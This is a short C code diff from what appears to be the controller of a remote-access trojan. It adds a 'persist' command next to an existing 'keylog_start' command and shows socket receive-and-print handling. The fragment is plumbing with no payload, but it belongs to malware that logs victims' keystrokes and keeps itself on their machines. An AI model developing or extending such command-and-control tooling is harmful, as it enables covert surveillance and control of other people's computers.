@@ -53,6 +53,9 @@ int main() {
        goto jump;
      } else if(strncmp("keylog_start ", buffer, 12) == 0) {
        goto jump;
+     } else if(strncmp("persist ", buffer, 7) == 0) {
+       recv(client_socket, response, sizeof(response), 0);
+       printf("%s", response);
      } else {
        recv(client_socket, response, sizeof(response), MSG_WAITALL); // block ops until the full request is done
        // printing response
